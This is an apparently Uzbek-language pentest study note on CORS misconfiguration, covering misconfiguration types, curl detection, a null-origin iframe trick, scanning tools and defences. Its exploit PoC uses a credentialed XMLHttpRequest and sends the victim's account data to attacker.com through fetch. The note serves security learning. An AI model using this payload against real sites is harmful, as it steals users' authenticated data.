# CORS Misconfiguration

> Lab yechimlari (PortSwigger'ning 3 ta labi) → `LABS.md`. Bu fayl — to'liq nazariya + payload + tool.

## Nima bu? (tushuncha)
Same-Origin Policy (SOP) bo'yicha bir domendagi JS boshqa domen javobini o'qiy olmaydi. CORS —
shu qoidaga **nazorat ostida istisno** beradigan mexanizm: server `Access-Control-Allow-Origin`
header'i bilan "falon domenga ruxsat" deydi. Zaiflik shunda: server bu ruxsatni **noto'g'ri
kenggina** beradi — masalan kelgan `Origin` ni ko'r-ko'rona aks ettiradi yoki `null` ga ishonadi.

**Ildiz sabab:** server qaysi origin'ga ishonishini qattiq ro'yxat (allowlist) bilan emas, dinamik
reflection bilan hal qiladi, ustiga `Allow-Credentials: true` qo'yadi. Natijada attacker sahifasi
`credentials:'include'` bilan qurbonning cookie'li javobini (shaxsiy data, token) o'qiy oladi.

## Turlari (noto'g'ri konfiguratsiya)
- **Origin reflection** — server kelgan `Origin` ni `Allow-Origin` ga qaytaradi (+ credentials).
- **`null` origin trust** — `Origin: null` ga ishonadi (sandboxed iframe bilan beriladi).
- **Zaif regex / suffix match** — `target.com.evil.com` yoki `eviltarget.com` o'tib ketadi.
- **Trusted subdomain / insecure protocol** — har subdomenga (HTTP ham) ishonadi → subdomen XSS chain.
- **`Allow-Origin: *` + credentials** — brauzer rad etadi, lekin ba'zan noto'g'ri implement qilinadi.

## Oqibatlar (IMPACT)
- **Qurbonning auth'li API javobini o'qiysan** — shaxsiy data, API key, token, CSRF token.
- Ko'pincha → account takeover zanjiri (o'qilgan token/key bilan).
> O'zi Medium/High; sensitive data yoki ATO chiqsa yuqoriroq.

## Asosiy shart (ikkisi birga)
1. Server `Access-Control-Allow-Origin`'ni **sening origin'ingga aks ettiradi** VA
2. `Access-Control-Allow-Credentials: true`.
Shunda `credentials:'include'` bilan cookie'li javobni o'qiysan.

## Aniqlash
```bash
curl -s -I https://target.com/api/me -H "Origin: https://evil.com" | grep -i "access-control"
```
> Javobda `Access-Control-Allow-Origin: https://evil.com` qaytsa — origin'ni aks ettiryapti, zaif.

## Noto'g'ri konfiguratsiya turlari
```http
# 1) Origin'ni ko'r-ko'rona aks ettirish
Origin: https://evil.com → Allow-Origin: https://evil.com  (ZAIF)

# 2) null ishonadi
Origin: null → Allow-Origin: null  (ZAIF)

# 3) Zaif tekshiruv (substring)
https://target.com.evil.com     → o'tadi
https://eviltarget.com          → o'tadi
```
`null` origin yasash:
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
  src="data:text/html,<script>/* exploit */</script>"></iframe>
```

## Exploit PoC
```html
<script>
  const r = new XMLHttpRequest();
  r.onload = () => fetch('https://attacker.com/log?d='+btoa(r.responseText));
  r.open('GET','https://target.com/api/account',true);
  r.withCredentials = true;
  r.send();
</script>
```
> Qurbon login turib bu sahifani ochsa — uning ma'lumoti sening serveringga tushadi.

## Muhim nuqta
`Allow-Origin: *` + `Allow-Credentials: true` birga ishlamaydi (brauzer taqiqlaydi).
Impact uchun javobda **auth'ga bog'liq sensitive** ma'lumot bo'lishi shart.

## TOOLLAR

### Corsy — CORS misconfig skaneri
```bash
python3 corsy.py -u https://target.com/api/me
```
> Bir nechta xavfli origin (reflected, null, prefix/suffix) variantini avtomat sinaydi.

### CORScanner — tez ommaviy skan
```bash
python3 cors_scan.py -i urls.txt -t 50
```
> Ko'p URL'da CORS teshigini bir yo'la tekshiradi (threadli).

### nuclei — CORS shablon
```bash
nuclei -l live_hosts.txt -t ~/nuclei-templates/http/misconfiguration/cors-misconfig.yaml
```
> Tayyor shablon bilan ommaviy CORS misconfig topadi.

### curl — qo'lda aniq tekshiruv
```bash
curl -s -I https://target.com/api/me -H "Origin: null" | grep -i "access-control"
```
> `null` origin qabul qilinadimi — eng klassik zaiflikni darhol ko'rsatadi.

## Himoya
Origin'ni qat'iy allowlist bilan tekshir (aks ettirma), `null` qabul qilma,
`Allow-Credentials: true`ni faqat ishonchli originlarga, sensitive'ni CSRF token bilan himoyala.
